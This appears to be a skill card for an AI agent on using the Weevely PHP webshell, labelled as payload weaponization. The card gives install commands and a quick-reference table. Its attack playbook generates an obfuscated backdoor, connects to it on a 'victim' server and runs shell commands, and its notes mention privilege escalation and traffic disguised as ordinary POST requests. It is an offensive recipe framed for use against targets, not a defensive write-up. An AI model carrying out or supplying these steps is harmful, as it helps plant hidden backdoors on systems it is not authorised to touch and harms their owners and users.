---
name: weevely-webshell
description: "Weevely: PHP webshell full-featured session. Signals: payload development, weaponization, connect, execute PHP, file transfer."
zh-signals: "Weevely: PHP webshell 全功能会话。信号:载荷开发,武器化,连接,执行 PHP,文件传输。"
when-to-use: >-
  Use when you have PHP code execution or file upload on a target and want a
  stealthy, full-featured webshell session with file transfer and
  post-exploitation modules.
---

# Weevely

- Attack Category: C07 Payload Development and Weaponization
- Upstream Repository: https://github.com/epinna/weevely3
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
apt install weevely or git clone + pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `weevely generate password agent.php` | Generate an obfuscated webshell |
| `weevely http://target/agent.php password` | Connect |
| `:shell_php` | Execute PHP |
| `:file_upload/:file_download` | File transfer |
| `:net_ifconfig` | Internal network information |
| `:audit_suid` | SUID enumeration |

## Attack Scenario Playbook

### Full-featured PHP webshell session

```bash
weevely generate Pass123 /tmp/w.php  # after uploading
weevely http://victim/uploads/w.php Pass123
weevely> :shell_sh whoami
```

## Notes
The obfuscated PHP backdoor ships with 30+ modules (SQL access, privilege escalation, proxy); traffic can be disguised as normal POST requests.
